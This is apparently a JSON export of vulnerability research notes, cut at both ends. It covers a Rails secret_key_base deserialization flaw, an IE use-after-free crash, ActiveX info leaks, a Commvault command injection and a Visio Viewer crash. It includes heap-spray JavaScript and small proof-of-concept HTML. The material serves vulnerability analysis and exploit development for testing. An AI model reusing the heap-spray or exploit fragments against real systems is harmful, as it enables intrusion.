00000000 0x480b8c0\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "1d473586-2d2b-41ba-a978-ed91c37225a0",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "1e91dad8-4a04-42cc-b143-c06594396938",
      "created": "2019-09-12T18:07:59.369692Z",
      "revisionDate": "2020-02-13T17:12:07.00034Z",
      "document": "\n\n## Background\n\nRuby on Rails is a server-side web application framework written in Ruby. It is a model-view-controller (MVC) archtecture, providing default structures for a database, a web service, and web pages. It is also a popular choice of framework among well known services and products such as Github, Bloomberg, Soundcloud, Groupon, Twitch.tv, and of course, Rapid7s Metasploit.\n\nRuby on Rails versions including 5.2.2.1 and prior are vulnerable to a deserialization attack, because the Rails application by default uses its own name as the secret_key_base in development mode. This can be easily extracted by visiting an invalid resource for a route, which as a result allows a remote user to create and deliver a signed serialized payload, load it by the application, and gain remote code execution.\n\nPlease note that this is not the same as the \"DoubleTap\" vulnerability. The other one is a directory traversal attack that in theory could be chained to aid remote code execution.\n\nIn this documentation, I will go over:\n\n* The setup I used to test the vulnerable environment.\n* My analysis on the vulnerability.\n* Some information about patching.\n\n## Vulnerable Setup\n\nIn order to set up a vulnerable box for testing, do the following on a Linux (Ubuntu) machine, assuming rvm is already installed:\n\n```bash\n$ rvm gemset create test\n$ rvm gemset use test\n$ gem install rails '5.2.1'\n$ rails new demo\n```\n\nNext, `cd` to demo, and then modify the Gemfile like this:\n\n```bash\n$ echo \"gem 'rails', '5.2.1'\" >> Gemfile\n$ echo \"gem 'sqlite3', '~> 1.3.6', '< 1.4'\" >> Gemfile\n$ echo \"source 'https://rubygems.org'\" >> Gemfile\n$ bundle\n```\n\nNext, add a new controller:\n\n```bash\nrails generate controller metasploit\n```\n\nAnd add the index method for that controller (under app/controllers/metasploit_controller.rb):\n\n```ruby\nclass MetasploitController < ApplicationController\n  def index\n    render file: \"#{Rails.root}/test.html\"\n  end\nend\n```\n\nIn the root directory, add a new test.html.\n\n```bash\necho Hello World > test.html\n```\n\nAlso, add that new route in config/routes.rb:\n\n```ruby\nRails.application.routes.draw do\n  resources :metasploit\nend\n```\n\nAnd finally, start the application:\n\n```bash\nrails s -b 0.0.0.0\n```\n\nBy default, the application should be using its name as the secret key that is hashed in MD5.\n\n## Vulnerability Analysis\n\nThe best way to understand the vulnerabilty is by looking at Rails' application.rb source code. Most importantly, the vulnerability comes from the `secret_key_base` method in the Application class (see railties/lib/rails/application.rb):\n\n```ruby\ndef secret_key_base\n  if Rails.env.test? || Rails.env.development?\n    secrets.secret_key_base || Digest::MD5.hexdigest(self.class.name)\n  else\n    validate_secret_key_base(\n      ENV[\"SECRET_KEY_BASE\"] || credentials.secret_key_base || secrets.secret_key_base\n      )\n  end\nend\n```\n\nWe see that in order to be vulnerable, we either need to be in test mode, or development mode. That way, the application will wither rely on a secret_key_base from somewhere (explained later), or it computes its own based on the application name.\n\n### Rails 5.2 (2017)\n\nBefore we move on with the analysis, it is interesting to point out that the vulnerable code we are looking at right now was actually meant to improve Rails security with encrypted credentials, which was introduced in Aug 3rd, 2017. Although meant for better security, it did not start off safe, but in fact, worse:\n\n```ruby\ndef secret_key_base\n  if Rails.env.test? || Rails.env.development?\n    Digest::MD5.hexdigest self.class.name\n    # Code omitted below\n```\n\nYou can see the pull request [here](<https://github.com/rails/rails/pull/30067>).\n\nBefore this, Rails used to rely on config/secrets.yml, which wasnt protected by encryption like 5.2's credentials.yml.enc file.\n\n### Where is the Secret?\n\nAccording to the vulnerable code, we know that by default, Rails would try to load the secret_key_base somewhre, otherwise it relies on the application name. On a newly installed Rails app, it seems it just defaults back to the application name, but let us take a look at the first condition anyway:\n\n```ruby\nsecrets.secret_key_base\n```\n\nHere we know that the secret_key_base comes from `secrets`. If we look around a little, we know that is actually a method:\n\n```ruby\ndef secrets\n  @secrets ||= begin\n    secrets = ActiveSupport::OrderedOptions.new\n    files = config.paths[\"config/secrets\"].existent\n    files = files.reject { |path| path.end_with?(\".enc\") } unless config.read_encrypted_secrets\n    secrets.merge! Rails::Secrets.parse(files, env: Rails.env)\n\n    # Fallback to config.secret_key_base if secrets.secret_key_base isn't set\n    secrets.secret_key_base ||= config.secret_key_base\n    # Fallback to config.secret_token if secrets.secret_token isn't set\n    secrets.secret_token ||= config.secret_token\n\n    if secrets.secret_token.present?\n      ActiveSupport::Deprecation.warn(\n        \"`secrets.secret_token` is deprecated in favor of `secret_key_base` and will be removed in Rails 6.0.\"\n        )\n    end\n\n    secrets\n  end\nend\n```\n\nAnd very quickly, we see that the secret comes from config/secrets.*, encrypted or not. Well, by default, a Rails app does not actually have this file, so it makes perfect sense we always fall back to the application name (in MD5) as the secret_key_base by default.\n\nNotice the above function basically means the secret is loaded from a file, and it is parsed. It does not actually tell us how that secret is parsed, so naturally this line has my curiosity:\n\n```ruby\nsecrets.merge! Rails::Secrets.parse(files, env: Rails.env)\n```\n\nAnd `Rails::Secrets.parse` comes from the secrets.rb file:\n\n```ruby\ndef parse(paths, env:)\n  paths.each_with_object(Hash.new) do |path, all_secrets|\n    require \"erb\"\n\n    secrets = YAML.load(ERB.new(preprocess(path)).result) || {}\n    all_secrets.merge!(secrets[\"shared\"].deep_symbolize_keys) if secrets[\"shared\"]\n    all_secrets.merge!(secrets[env].deep_symbolize_keys) if secrets[env]\n  end\n```\n\nThis tells a couple of things:\n\n* The secrets file should be a ERB template, and it is serialized.\n* Before it is loaded, the content is spit out by a method called `preprocess`\n\nIf the secrets file is encrypted (ends with `.enc`), then this decryption routine should run before it is deserialized:\n\n```ruby\ndef _decrypt(encrypted_message, purpose)\n  cipher = new_cipher\n  encrypted_data, iv, auth_tag = encrypted_message.strip.split(\"--\".freeze).map { |v| ::Base64.strict_decode64(v) }\n\n  # Currently the OpenSSL bindings do not raise an error if auth_tag is\n  # truncated, which would allow an attacker to easily forge it. See\n  # https://github.com/ruby/openssl/issues/63\n  raise InvalidMessage if aead_mode? && (auth_tag.nil? || auth_tag.bytes.length != 16)\n\n  cipher.decrypt\n  cipher.key = @secret\n  cipher.iv  = iv\n  if aead_mode?\n    cipher.auth_tag = auth_tag\n    cipher.auth_data = \"\"\n  end\n\n  decrypted_data = cipher.update(encrypted_data)\n  decrypted_data << cipher.final\n\n  message = Messages::Metadata.verify(decrypted_data, purpose)\n  @serializer.load(message) if message\nrescue OpenSSLCipherError, TypeError, ArgumentError\n  raise InvalidMessage\nend\n```\n\nBasically, the code is expecting the input to be in this format, and is split by `--`:\n\n```ruby\nstring1--string2--string3\n```\n\nThe first string is the actual encrypted data. The second string is the IV. The third is the auth tag. Each substring is Base64 encoded, so after splitting the string, they need to be decoded. What happens next depends on the code using the decryption method, beause it needs to specity what cipher to use. In the case of secrets.yml.enc, we are expecting AES-128-GCM, because it is specified in secrets.rb:\n\n```ruby\n@cipher = \"aes-128-gcm\"\n```\n\nAfter that, our decrypted string is deserialized, and loaded as the secret. Technically, if a user has access to secrets.yml, they could backdoor this too to gain remote code execution.\n\nHowever, like I previously said, all this does not even happen by default, because there is no secrets.yml by default. Using the application name as the key is definitely a much bigger concern for Rails users.\n\n## Patching\n\nSince vulnerable version relies on the application name to create the secret_key_base, it is easy to mitigate this. Originally, this was the vulnerable code:\n\n```ruby\ndef secret_key_base\n  if Rails.env.test? || Rails.env.development?\n    secrets.secret_key_base || Digest::MD5.hexdigest(self.class.name)\n    # Code omitted below\n```\n\nAnd that becomes the following the patched version:\n\n```ruby\ndef secret_key_base\n  if Rails.env.development? || Rails.env.test?\n    secrets.secret_key_base ||= generate_development_secret\n    # Code omitted below\n```\n\nIn method `generate_development_secret`, the key is completely randomized using SecureRandom:\n\n```ruby\ndef generate_development_secret\n  if secrets.secret_key_base.nil?\n    key_file = Rails.root.join(\"tmp/development_secret.txt\")\n\n    if !File.exist?(key_file)\n      random_key = SecureRandom.hex(64)\n      File.binwrite(key_file, random_key)\n    end\n\n    secrets.secret_key_base = File.binread(key_file)\n  end\n\n  secrets.secret_key_base\nend\n```\n\nLooks like everything a-okay.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "1f720314-2636-487c-80fc-e964389b8b04",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "c2a72919-3813-4486-acad-02857ada29e5",
      "created": "2019-09-12T18:08:00.039663Z",
      "revisionDate": "2020-10-19T23:07:58.953474Z",
      "document": " Set innerHTML\n[*] EBX after EnsureRecalcNotify is: 0x0998cff0\n\n0998cff0  ???????? ???????? ???????? ????????\n0998d000  ???????? ???????? ???????? ????????\n0998d010  ???????? ???????? ???????? ????????\n0998d020  ???????? ???????? ???????? ????????\n0998d030  ???????? ???????? ???????? ????????\n0998d040  ???????? ???????? ???????? ????????\n0998d050  ???????? ???????? ???????? ????????\n0998d060  ???????? ???????? ???????? ????????\n```\n\nWhich is lated used in the crash (see ESI):\n\n```\n(d9c.694): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0bcebd00 ebx=00000000 ecx=11cf98b5 edx=aa0082bb esi=0998cff0 edi=047fd70c\neip=6b8199cd esp=047fd6d0 ebp=047fd6e8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nMSHTML!QIClassID+0x38:\n6b8199cd 8b06            mov     eax,dword ptr [esi]  ds:0023:0998cff0=????????\n```\n\nThis is because in the vulnerable version, EnsureRecalcNotify returns the invalid\nreference, passes it to GetLineInfo, and later used in the crash:\n\n```\n.text:639F5549 loc_639F5549:                           ; CODE XREF: CDisplayPointer::MoveToMarkupPointer(IMarkupPointer *,IDisplayPointer *)+6E\u0018j\n.text:639F5549                 test    eax, eax\n.text:639F554B                 jz      loc_6378185D\n.text:639F5551                 push    1\n.text:639F5553                 mov     edi, eax\n.text:639F5555                 call    ?EnsureRecalcNotify@CElement@@QAEJH@Z ; CElement::EnsureRecalcNotify(int)\n.text:639F555A                 lea     ecx, [esp+18h+var_8] ; After the EnsureRecalcNotify call, EBX is invalid\n.text:639F555E                 push    ecx\n.text:639F555F                 push    ebx\n.text:639F5560                 call    GetLineInfo     ; To the crash\n.text:639F5565                 jmp     loc_63908A6E\n```\n\nIn the patched version, the return value of EnsureNotifyValue is checked before calling GetLineInfo:\n\n```\n.text:639F5213 loc_639F5213:                           ; CODE XREF: CDisplayPointer::MoveToMarkupPointer(IMarkupPointer *,IDisplayPointer *)+6F\u0018j\n.text:639F5213                 test    eax, eax\n.text:639F5215                 jz      loc_63780DDD\n.text:639F521B                 push    1\n.text:639F521D                 mov     edi, eax\n.text:639F521F                 call    ?EnsureRecalcNotify@CElement@@QAEJH@Z ; CElement::EnsureRecalcNotify(int)\n.text:639F5224                 mov     edi, eax\n.text:639F5226                 test    edi, edi\n.text:639F5228                 js      loc_63907FAF    ; to RETN\n.text:639F522E                 mov     edx, [ebp+arg_4]\n.text:639F5231                 lea     ecx, [esp+18h+var_8]\n.text:639F5235                 push    ecx\n.text:639F5236                 push    edx\n.text:639F5237                 call    GetLineInfo\n.text:639F523C                 jmp     loc_63907F1E\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "40d24a0b-1d82-4338-9aa9-e241306574e1",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "72a32040-b880-4c3c-890f-9ccae8820bb3",
      "created": "2019-09-12T18:08:00.664017Z",
      "revisionDate": "2020-02-13T17:12:06.530068Z",
      "document": "\n\n# Info Leak Through ForceRemoteBehavior\n\nThe ForceRemoteBehavior getter, when using an \"unitialized\" issymbol\nobject allows to disclose address from issymbol. Issymbol isn't aslr\ncompatible, but could rebase. Anyway, issymbol doesn't contain pointers\nto interesting API's for ASLR bypass, so even when it would be easy\nto use the issymbol.dll it won't be usefull because of this.\n\n```\n<html>\n<body>\n<object classid='clsid:3c9dff6f-5cb0-422e-9978-d6405d10718f' id='test'></object>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<script language='javascript'>\nalert(test.ForceRemoteBehavior);\n</script>\n</body>\n</html>\n```\n\n# Info Leak through StartupColumnTranslate\n\nOverflowing the vulnerable InternationalSeparator() method with 212 bytes\nallows to reach the pointer to the StartupColumnTranslate property (string).\n\nBy overflowing this pointer should be possible to retrieve arbitrary data\nfrom the memory map by using the StartupColumnTranslate getter:\n\n```\n.text:1000EF40 StartupColumnTranslate_sub_1000EF40 proc near ; DATA XREF: .rdata:101DCE98\u0019o\n.text:1000EF40\n.text:1000EF40 var_10          = byte ptr -10h\n.text:1000EF40 var_C           = dword ptr -0Ch\n.text:1000EF40 var_4           = dword ptr -4\n.text:1000EF40\n.text:1000EF40                 push    0FFFFFFFFh\n.text:1000EF42                 push    offset sub_101B7579\n.text:1000EF47                 mov     eax, large fs:0\n.text:1000EF4D                 push    eax\n.text:1000EF4E                 push    ecx\n.text:1000EF4F                 push    esi\n.text:1000EF50                 mov     eax, ___security_cookie\n.text:1000EF55                 xor     eax, esp\n.text:1000EF57                 push    eax\n.text:1000EF58                 lea     eax, [esp+18h+var_C]\n.text:1000EF5C                 mov     large fs:0, eax\n.text:1000EF62                 add     ecx, 2540h ; ecx + 2540h => pointer to StartupColumnTranslate property\n.text:1000EF68                 push    ecx\n.text:1000EF69                 lea     ecx, [esp+1Ch+var_10]\n.text:1000EF6D                 call    ds:??0?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QAE@ABV01@@Z ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>> const &)\n.text:1000EF73                 lea     ecx, [esp+18h+var_10]\n.text:1000EF77                 mov     [esp+18h+var_4], 0\n.text:1000EF7F                 call    ds:?AllocSysString@?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QBEPA_WXZ ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::AllocSysString(void)\n.text:1000EF85                 lea     ecx, [esp+18h+var_10] ; void *\n.text:1000EF89                 mov     esi, eax\n.text:1000EF8B                 call    ds:__imp_??1?$CStringT@_WV?$StrTraitMFC_DLL@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@QAE@XZ ; ATL::CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>::~CStringT<wchar_t,StrTraitMFC_DLL<wchar_t,ATL::ChTraitsCRT<wchar_t>>>(void)\n.text:1000EF91                 mov     eax, esi\n.text:1000EF93                 mov     ecx, [esp+18h+var_C]\n.text:1000EF97                 mov     large fs:0, ecx\n.text:1000EF9E                 pop     ecx\n.text:1000EF9F                 pop     esi\n.text:1000EFA0                 add     esp, 10h\n.text:1000EFA3                 retn\n.text:1000EFA3 StartupColumnTranslate_sub_1000EF40 endp\n```\n\nPROBLEM: It's using the Microsoft Foundation Classes, and create fake\nstrings memory objects in memory isn't so easy! We should dig in to that,\nshould be possible with more work!\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "0271033a-f9b4-40ec-8025-f0cb39f093f5",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "22fbb59c-78df-4f7c-a466-a00f4cc6cfaf",
      "created": "2019-09-12T18:08:01.275404Z",
      "revisionDate": "2020-02-13T17:12:06.330501Z",
      "document": "-\n\n\nLooks like this has changed.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "45f510f2-5fd3-40f8-a305-2b11064285de",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "9d676126-93a9-4ebe-aa98-ac235ee50529",
      "created": "2019-09-12T18:08:01.97855Z",
      "revisionDate": "2020-10-19T22:49:43.908258Z",
      "document": "\n\n## Introduction\n\nCommvault is a data protection and information management software; an enterprise-level data\nplatform that contains modules to back up, restore, archive, replicate, and search data.\n\nAccording to public documentation, the data is protected by installing agent software on the\nphysical or virtual hosts, which use the OS or application native APIs to protect data in a\nconsistent state. Production data is processed by the agent on client computers and backuped\nup through a data manager (the MediaAgent) to disk, tape, or cloud storage. All data\nmanagement activity in the environment is tracked by a centralized server (called CommServe),\nand can be managed by administrators through a central user interface. End users can access\nprotected data using web browsers or mobile devices.\n\nOne of the base services of Commvault is vulnerable to a remote command injection attack,\nspecifically the cvd service. It was a Metasploit submission by [@rwincey as PR #9340](https://github.com/rapid7/metasploit-framework/pull/9340).\n\n## Vulnerable Application\n\nAccording to the public advisory, Commvault v11 SP5 or prior are vulnerable to this\nvulnerability.\n\nThe specific vulnerable version I tested was 11.0.80.0, and the software was obtained from\nthe Metasploit contributor @rwincey. The software is available from our Google Drive at:\n\n**Vulnerable Apps -> Commvault -> Commvault_R80_SP5_22September16.exe**.\n\nThe version of the vulnerable DLL is:\n\n```\n    Image path: C:\\Program Files\\Commvault\\ContentStore\\Base\\CVDataPipe.dll\n    Image name: CVDataPipe.dll\n    Timestamp:        Wed Dec 21 11:59:21 2016 (585AC2F9)\n    CheckSum:         002ED404\n    ImageSize:        002F0000\n    File version:     11.80.50.60437\n    Product version:  11.0.0.0\n    File flags:       1 (Mask 3F) Debug\n    File OS:          40004 NT Win32\n    File type:        1.0 App\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    CompanyName:      Commvault\n    ProductName:      Commvault\n    InternalName:     CVDataPipe\n    OriginalFilename: CVDataPipe.dll\n    ProductVersion:   11.0.0.0\n    FileVersion:      11.80.50.60437\n    PrivateBuild:\n    SpecialBuild:\n    FileDescription:\n    LegalCopyright:   Copyright (c) 2000-2016\n    LegalTrademarks:\n    Comments:\n```\n\n## Root Cause Analysis\n\nBased on the information we have from the pull request, the vulnerability is a command injection, so\nthat's where we begin reversing.\n\nUsually, there are two ways to execute a command in a C/C++ application, one of them is ```WinExec()```,\nand the other one is ```CreateProcess()```:\n\n```\nBOOL WINAPI CreateProcess(\n  _In_opt_    LPCTSTR               lpApplicationName,\n  _Inout_opt_ LPTSTR                lpCommandLine,\n  _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,\n  _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n  _In_        BOOL                  bInheritHandles,\n  _In_        DWORD                 dwCreationFlags,\n  _In_opt_    LPVOID                lpEnvironment,\n  _In_opt_    LPCTSTR               lpCurrentDirectory,\n  _In_        LPSTARTUPINFO         lpStartupInfo,\n  _Out_       LPPROCESS_INFORMATION lpProcessInformation\n);\n\n```\n\nSince ```CreateProcess()``` is meant to replace ```WinExec()``` according to Microsoft, we can create a\nbreak point there fist in our debugger (WinDBG), and we hit it:\n\n```\n0:044> g\nBreakpoint 3 hit\nkernel32!CreateProcessA:\n00000000`76fe8730 4c8bdc          mov     r11,rsp\n```\n\nLooking at the callstack of this ```kernel32!CreateProcessA```, we already have a pretty good idea\nlocating the vulnerability:\n\n```\n0:044> k\nChild-SP          RetAddr           Call Site\n00000000`11a36b78 000007fe`f378a40f kernel32!CreateProcessA\n00000000`11a36b80 000007fe`f377714e CVDataPipe!execCmd+0x7af\n00000000`11a3f340 000007fe`f3777a69 CVDataPipe!CVDMessageHandler+0x78e\n00000000`11a3fbd0 000007fe`f9cdc58d CVDataPipe!CVDMessageHandler+0x10a9\n00000000`11a3fd40 000007fe`f9cdc1b1 CvBasicLib!CvThreadPool::th_defaultWorkerObj+0x3cd\n00000000`11a3fe40 000007fe`f9cd2073 CvBasicLib!CvThreadPool::th_defaultWorker+0x51\n00000000`11a3fe90 000007fe`f9a84f7f CvBasicLib!CvThread::~CvThread+0x63\n00000000`11a3fee0 000007fe`f9a85126 MSVCR120!_callthreadstartex+0x17 [f:\\dd\\vctools\\crt\\crtw32\\startup\\threadex.c @ 376]\n00000000`11a3ff10 00000000`76f6f56d MSVCR120!_threadstartex+0x102 [f:\\dd\\vctools\\crt\\crtw32\\startup\\threadex.c @ 354]\n00000000`11a3ff40 00000000`770a3281 kernel32!BaseThreadInitThunk+0xd\n00000000`11a3ff70 00000000`00000000 ntdll!RtlUserThreadStart+0x1d\n```\n\nThere are two things that are interesting. One of them is ```CVDataPipe!CVDMessageHandler```, and the\nother one is ```CVDataPipe!execCmd```.\n\n```CVDataPipe!CVDMessageHandler``` is basically a function that handles our packet's message type.\nThe Metasploit exploit specifically sends a code of ```9h```, which is the message type for ```execCmd```:\n\n```\n.text:0000000180147103 loc_180147103:                          ; CODE XREF: CVDMessageHandler(int,selectStruct_t *,CQiSocket,void *):loc_180146D78\u0018j\n.text:0000000180147103                 lea     rax, [rsp+888h+var_220] ; jumptable 0000000180146D78 case 9\n.text:000000018014710B                 mov     [rsp+888h+var_600], rax\n.text:0000000180147113                 mov     rdx, [rsp+888h+sock]\n.text:000000018014711B                 mov     rcx, [rsp+888h+var_600]\n.text:0000000180147123                 call    cs:??0CQiSocket@@QEAA@AEBV0@@Z ; CQiSocket::CQiSocket(CQiSocket const &)\n.text:0000000180147129                 mov     [rsp+888h+var_5F0], rax\n.text:0000000180147131                 mov     r8, [rsp+888h+arg_18]\n.text:0000000180147139                 mov     rdx, [rsp+888h+var_5F0]\n.text:0000000180147141                 mov     rcx, [rsp+888h+structSelect]\n.text:0000000180147149                 call    ?execCmd@@YAXPEAUselectStruct_t@@VCQiSocket@@PEAX@Z ; execCmd(selectStruct_t *,CQiSocket,void *)\n```\n\nIf we take a closer look at the ```execCmd``` function, we can tell the purpose of it is for processes such as:\n\n* ifind (For restoring purposes)\n* BackupShadow.exe (For archiving)\n* Pub (Map file)\n* createIndex (A Commvault process for building index)\n\n\n```\n.text:0000000180159F1B loc_180159F1B:                          ; CODE XREF: execCmd(selectStruct_t *,CQiSocket,void *)+261\u0018j\n.text:0000000180159F1B                                         ; DATA XREF: .rdata:0000000180286258\u0019o\n.text:0000000180159F1B                 lea     rdx, aIfind     ; \"ifind\"\n.text:0000000180159F22                 lea     rcx, [rsp+87B8h+ApplicationName] ; Str\n.text:0000000180159F2A                 call    cs:strstr\n.text:0000000180159F30                 test    rax, rax\n.text:0000000180159F33                 jnz     short loc_180159F6D\n.text:0000000180159F35                 lea     rdx, aBackupshadow_e ; \"BackupShadow.exe\"\n.text:0000000180159F3C                 lea     rcx, [rsp+87B8h+ApplicationName] ; Str\n.text:0000000180159F44                 call    cs:strstr\n.text:0000000180159F4A                 test    rax, rax\n.text:0000000180159F4D                 jnz     short loc_180159F6D\n.text:0000000180159F4F                 lea     rdx, aPub       ; \"Pub\"\n.text:0000000180159F56                 lea     rcx, [rsp+87B8h+ApplicationName] ; Str\n.text:0000000180159F5E                 call    cs:strstr\n...\n.text:000000018015A0BA loc_18015A0BA:                          ; CODE XREF: execCmd(selectStruct_t *,CQiSocket,void *)+307\u0018j\n.text:000000018015A0BA                 lea     rdx, aCreateindex ; \"createIndex\"\n.text:000000018015A0C1                 lea     rcx, [rsp+87B8h+ApplicationName] ; Str\n.text:000000018015A0C9                 call    cs:strstr\n.text:000000018015A0CF                 test    rax, rax\n.text:000000018015A0D2                 jz      loc_18015A220\n```\n\nHowever, if you don't call one of these processes, the ```exeCmd``` will assume you want to run your\ncustom process, and pass it to ```CreateProcess``` anyway:\n\n```\n.text:000000018015A361 loc_18015A361:                          ; CODE XREF: execCmd(selectStruct_t *,CQiSocket,void *)+675\u0018j\n.text:000000018015A361                 call    cs:GetEnvironmentStrings\n.text:000000018015A367                 mov     [rsp+87B8h+var_86A8], rax\n.text:000000018015A36F                 lea     rax, [rsp+87B8h+StartupInfo]\n.text:000000018015A377                 mov     rdi, rax\n.text:000000018015A37A                 xor     eax, eax\n.text:000000018015A37C                 mov     ecx, 68h\n.text:000000018015A381                 rep stosb\n.text:000000018015A383                 mov     [rsp+87B8h+StartupInfo.cb], 68h\n.text:000000018015A38E                 lea     rax, [rsp+87B8h+ProcessInformation]\n.text:000000018015A396                 mov     rdi, rax\n.text:000000018015A399                 xor     eax, eax\n.text:000000018015A39B                 mov     ecx, 18h\n.text:000000018015A3A0                 rep stosb\n.text:000000018015A3A2                 mov     [rsp+87B8h+StartupInfo.dwFlags], 1\n.text:000000018015A3AD                 xor     eax, eax\n.text:000000018015A3AF                 mov     [rsp+87B8h+StartupInfo.wShowWindow], ax\n.text:000000018015A3B7                 lea     rax, [rsp+87B8h+ProcessInformation]\n.text:000000018015A3BF                 mov     [rsp+87B8h+lpProcessInformation], rax ; lpProcessInformation\n.text:000000018015A3C4                 lea     rax, [rsp+87B8h+StartupInfo]\n.text:000000018015A3CC                 mov     [rsp+87B8h+lpStartupInfo], rax ; lpStartupInfo\n.text:000000018015A3D1                 mov     [rsp+87B8h+lpCurrentDirectory], 0 ; lpCurrentDirectory\n.text:000000018015A3DA                 mov     [rsp+87B8h+lpEnvironment], 0 ; lpEnvironment\n.text:000000018015A3E3                 mov     [rsp+87B8h+dwCreationFlags], 10h ; dwCreationFlags\n.text:000000018015A3EB                 mov     [rsp+87B8h+bInheritHandles], 0 ; bInheritHandles\n.text:000000018015A3F3                 xor     r9d, r9d        ; lpThreadAttributes\n.text:000000018015A3F6                 xor     r8d, r8d        ; lpProcessAttributes\n.text:000000018015A3F9                 lea     rdx, [rsp+87B8h+CommandLine] ; lpCommandLine\n.text:000000018015A401                 lea     rcx, [rsp+87B8h+ApplicationName] ; lpApplicationName\n.text:000000018015A409                 call    cs:CreateProcessA\n```\n\nIt is unclear whether allowing an arbitrary custom process is intentional or not, it is unsafe\nanyway considering the cvd process binds to 0.0.0.0, so anybody can access to it.\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "7d961ff9-54c1-4ac5-87e3-a4bd7489554f",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "990312e7-e60f-4927-aeca-7962d78ec64c",
      "created": "2019-09-12T18:08:02.660146Z",
      "revisionDate": "2020-02-13T17:12:05.843083Z",
      "document": "\n\n# PoC\n\n* PoC:  http://aluigi.org/poc/ole32_1.zip\n* Embed a Visio Viewer In a Web Page: http://msdn.microsoft.com/en-us/library/aa168474(v=office.11).aspx\n\n# Details\n\nCrash Windows XP SP3 Visio Viewer 2010\n\n```\n(9b8.9bc): Unknown exception - code e0000002 (first chance)\n(9b8.9bc): C++ EH exception - code e06d7363 (first chance)\n(9b8.9bc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=001c12b8 ebx=00000000 ecx=00400035 edx=00000000 esi=001e6498 edi=029c4240\neip=0e000000 esp=00136cf4 ebp=00136d24 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\n0e000000 ??              ???\n0:000> !exchain\nTRIAGER: Could not open triage file : C:\\Program Files\\Windows Kits\\8.0\\Debuggers\\x86\\triage\\oca.ini, error 2\nTRIAGER: Could not open triage file : C:\\Program Files\\Windows Kits\\8.0\\Debuggers\\x86\\winxp\\triage.ini, error 2\nTRIAGER: Could not open triage file : C:\\Program Files\\Windows Kits\\8.0\\Debuggers\\x86\\triage\\user.ini, error 2\n00136db4: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\PROGRA~1\\MICROS~2\\Office14\\VVIEWER.DLL -\nVVIEWER!GetAllocCounters+132fc0 (602ae0fd)\n00136de0: VVIEWER!GetAllocCounters+1332f5 (602ae432)\n00136e2c: VVIEWER!GetAllocCounters+1311ba (602ac2f7)\n00136ecc: VVIEWER!GetAllocCounters+1309e1 (602abb1e)\n00136f40: VVIEWER!GetAllocCounters+130f7c (602ac0b9)\n001381f4: VVIEWER!GetAllocCounters+11cf02 (6029803f)\n00138228: VVIEWER!GetAllocCounters+11baee (60296c2b)\n0013eae0: USER32!_except_handler3+0 (7e44048f)\n  CRT scope  0, func:   USER32!UserCallWinProcCheckWow+155 (7e44ac6b)\n0013eb40: USER32!_except_handler3+0 (7e44048f)\n0013ee5c: BROWSEUI!_except_handler3+0 (76001b21)\n  CRT scope  0, filter: BROWSEUI!BrowserProtectedThreadProc+56 (75fa5394)\n                func:   BROWSEUI!BrowserProtectedThreadProc+72 (75fa53b5)\n0013ffe0: kernel32!_except_handler3+0 (7c839ac0)\n  CRT scope  0, filter: kernel32!BaseProcessStart+29 (7c843882)\n                func:   kernel32!BaseProcessStart+3a (7c843898)\n\n!heap addressses come on!!!!\n```\n\n\n```ruby\njs_pivot = <<-JS\nvar heap_obj = new heapLib.ie(0x20000);\nvar code = unescape(\"#{js_code}\");\nvar nops = unescape(\"#{js_nops}\");\n\nwhile (nops.length < 0x80000) nops += nops;\nvar offset = nops.substring(0, #{my_target['Offset']});\nvar shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\nwhile (shellcode.length < 0x40000) shellcode += shellcode;\nvar block = shellcode.substring(0, (0x80000-6)/2);\n\nheap_obj.gc();\nheap_obj.debugHeap(true);\nfor (var i=1; i < 0x1e0; i++) {\n\theap_obj.alloc(block);\n}\nheap_obj.debugHeap(false);\nJS\n```\n\nheap spray to populate 200020\n\n```html\n<script>\n\tvar heap_obj = new heapLib.ie(0x20000);\n\tvar nops = unescape(\"%u0c0c%u0c0c\");\n\n\twhile (nops.length < 0x80000) nops += nops;\n\tvar shellcode = nops.substring(0, 0x800);\n\n\twhile (shellcode.length < 